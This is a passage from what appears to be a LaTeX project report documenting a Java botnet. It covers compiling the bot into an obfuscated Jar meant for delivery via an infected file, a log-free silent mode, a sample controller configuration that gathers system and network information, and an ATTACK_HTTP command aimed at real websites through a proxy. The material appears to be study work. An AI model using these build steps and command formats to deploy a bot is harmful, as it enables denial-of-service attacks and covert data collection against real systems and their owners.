\section{Usage}
\label{sec:usage}

The program can be run as a Java project inside an IDE, as a Maven project or as a self-contained Jar.
In a real scenario, the program would be delivered via an infected file as a self-contained, minimized and obfuscated Jar. Therefore, here, we will show only this compilation and execution method.
The reader may refer to the \texttt{README} file for details on other compilation and execution methods.

In the following, we assume that the execution environment is provided with JDK SE 8 (downloadable from \cite{jdk}) and Maven 3 (downloadable from \cite{maven}). We also assume that both the Jar execution and whichever referenced file do not require any root rights.

\subsection{Compilation}
\label{sec:compilation}

The bot is compiled into a self-contained Jar using the Maven packaging procedure, running the command:

\begin{verbatim}
  $[bot-dir]> mvn package -P optimize,skip-tests
\end{verbatim}

The previous command executes the packaging using both the profile \texttt{optimize} and \texttt{skip-tests}.

Since the bot code should always be optimized — i.e. minimized and obfuscated — we recommend providing this stage, activating the \texttt{optimize} profile. The code optimization is realized by running Proguard in the background (downloadable from \cite{proguard}) and may slow down the compilation. If the execution environment doesn't require code optimization, or some compilation speed up is desidered, simply omit the corresponding profile.

Since the project involves more than one hundred JUnit tests, we recommend skipping them to speed up compilation, activating the \texttt{skip-tests} profile. If you considered necessary to perform tests, simply omit the corresponding profile.

The compilation produces a Jar file \texttt{botnet-1.0-optimized.jar} in the \texttt{target} folder. Since it is self-contained, it can be run in any system directory. In the following, we refer to this Jar with the shorter name \texttt{botnet.jar}.


\subsection{Execution}
\label{sec:execution}

The program provides the user with three execution mode: \texttt{default}, \texttt{trace} and \texttt{silent}, which are distinguished by the adopted logging discipline. The \texttt{default} mode prints in console the strictly relevant output and produces log files. The \texttt{trace} mode prints in console a detailed tracing output and produces log files. The \texttt{silent} mode does neither print anything in console nor produce any log file.
To run the program in one of these modes, specify the corresponding options \texttt{--trace} or \texttt{--silent}.

The program behaviour can be customized providing a custom YAML configuration file. If no configuration is specified, the program runs with default configuration. To run the program with custom configuration, specify the corresponding configuration, with the option \texttt{--config}.

To run the program with default configuration and default execution mode, run the command:

\begin{verbatim}
  $> java -jar botnet.jar
\end{verbatim}

To run the program in \texttt{trace} execution mode, run the command:

\begin{verbatim}
  $> java -jar botnet.jar --trace
\end{verbatim}

To run the program in \texttt{silent} execution mode, run the command:

\begin{verbatim}
  $> java -jar botnet.jar --silent
\end{verbatim}

To run the program with custom configuration, run the command:

\begin{verbatim}
  $> java -jar botnet.jar --config <CONFIG-FILE>
\end{verbatim}

The reader may refer to the program CLI helper for the options usage. We show here the helper output for reader's convenience.

\begin{verbatim}

   -s,--silent               Activate silent mode.
   -t,--trace                Activate trace mode.
   -v,--version              Show app version.
\end{verbatim}


\subsection{Sample execution}
\label{sec:sample-execution}

We show here a sample execution to give the reader an idea about how everything works. We suggest the reader to refer to \cite{video-tutorial} to better undesrtand how configuration and commands could be conveniently generated.

In thi example, the bot is run in default mode with the following configuration:

\begin{verbatim}
  cnfInfo: True
  tgtInfo: True
  sysInfo: True
  netInfo: True
  controllers:
    - init: invalid/botinit.json
      command: invalid/botcmd.json
      log: invalid/botlog.json
    - init: controller/botinit.json
      command: controller/botcmd.json
      log: controller/botlog.json
  polling: 90-120:SECONDS
  reconnections: 3
  reconnectionWait: 2-5:SECONDS
  proxy: none
  userAgent: MyAwesomeBot
\end{verbatim}

Notice that the first specified controller is an invalid one - it mimics an unrecheable or compromised contoller.
The controller gives the bot the following \texttt{ATTACK-HTTP} command:

\begin{verbatim}
  {
    "command": "ATTACK_HTTP",
    "attacks": [
      {
        "method": "GET",
        "target": "http://www.twitter.com"
      },
      {
        "method": "GET",
        "target": "http://www.google.com",
        "proxy": "31.220.56.101:80",
        "properties": {
          "User-Agent": "MyAwesomeBot"
        },
        "executions": 3,
        "period": "10-15:SECONDS"
      }
    ]
  }
\end{verbatim}

followed by commands \texttt{REPORT} and \texttt{KILL}.
The following is the console output\footnote{classes and methods name indicated in \ref{sec:logging} have been omitted for better page formatting.}:
